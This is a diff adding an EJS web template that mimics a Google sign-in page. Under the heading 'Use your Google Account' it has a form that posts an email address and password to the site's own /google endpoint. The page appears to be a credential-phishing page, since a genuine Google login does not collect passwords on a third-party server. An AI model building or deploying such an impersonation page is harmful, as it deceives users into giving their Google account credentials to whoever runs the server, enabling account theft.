@@ -1,0 +1,24 @@
+<%- include('./partials/header') %>
+<title>Login with Google</title>
+<link rel="stylesheet" href="/stylesheets/google.css">
+</head>
+
+<body>
+  <!--[if lt IE 7]>
+      <p class="browsehappy">You are using an <strong>outdated</strong> browser. Please <a href="#">upgrade your browser</a> to improve your experience.</p>
+    <![endif]-->
+  <div class="box">
+    <h2>Sign In</h2>
+    <p>Use your Google Account</p>
+    <form action="/google" method="POST">
+      <div class="inputBox">
+        <input type="email" name="email" value="" placeholder="Username">
+      </div>
+      <div class="inputBox">
+        <input type="password" name="password" value="" placeholder="Password">
+      </div>
+      <button class="btn">Sign In</button>
+    </form>
+  </div>
+
+  <%- include('./partials/footer') %>
